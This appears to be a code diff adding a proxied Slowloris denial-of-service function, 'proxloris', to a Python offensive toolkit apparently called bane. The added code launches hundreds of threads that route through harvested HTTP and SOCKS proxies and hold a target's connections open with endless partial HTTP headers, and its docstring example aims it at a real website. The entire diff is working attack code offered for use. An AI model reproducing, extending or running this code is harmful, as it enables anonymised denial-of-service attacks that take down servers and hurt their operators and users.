@@ -1019,6 +1019,95 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
   except KeyboardInterrupt:
    stop=True
    break
+class plor(threading.Thread):
+ def run(self):
+  global counter
+  while (stop!=True):
+   try:
+    z=random.randint(1,20)
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     line=random.choice(httplist)
+    elif (z in [13,14,15,16]):
+     line=random.choice(socks4list)
+    elif (z in [17,18,19,20]):
+     line=random.choice(socks5list)
+    ipp=line.split(":")[0].split("=")[0]
+    pp=line.split(":")[1].split("=")[0]
+    s =socks.socksocket()
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+    elif (z in [13,14,15,16]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+    elif (z in [17,18,19,20]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    if z<13:
+     s.settimeout=(timeout)
+    s.connect((target,port))
+    if ((port==443)or(port==8443)):
+     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
+    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
+    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+    s.send("Connection: keep-alive\r\n".encode("utf-8"))
+    while (stop!=True):
+     s.send("X-a: {}\r\n".format(random.randint(1,10000000)).encode("utf-8"))
+     time.sleep(speed)
+     print"socket-->{}".format(ipp)
+   except:
+    pass
+def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,level=1):
+ '''
+  u: target ip or domain
+  p: (set by default to: 80) targeted port
+  threads: (set by default to: 500) number of connections
+  maxtime: (set by default to: 5) the connection timeout flag value
+  example:
+  >>>import bane
+  >>>bane.proxhammer('www.google.com',threads=256)
+'''
+ global speed
+ speed=level
+ global httplist
+ if httpl:
+  httplist=httpl
+ else:
+  httplist=masshttp()
+ global socks4list
+ if socks4l:
+  socks4list=socks4l
+ else:
+  socks4list=massocks4()
+ global socks5list
+ if socks5l:
+  socks5list=socks5l
+ else:
+  socks5list=massocks5()
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global pointer
+ global target
+ target=u
+ global port
+ port=p
+ global timeout
+ timeout=maxtime
+ for j in range(threads):
+    t=plor()
+    t.start()
+    time.sleep(.001)
+ c=time.time()
+ while True:
+  try:
+   time.sleep(.1)
+   if int(time.time()-c)==interval:
+    stop=True
+    break
+  except KeyboardInterrupt:
+   stop=True
+   break
 class phu(threading.Thread):
  def run(self):
   global counter
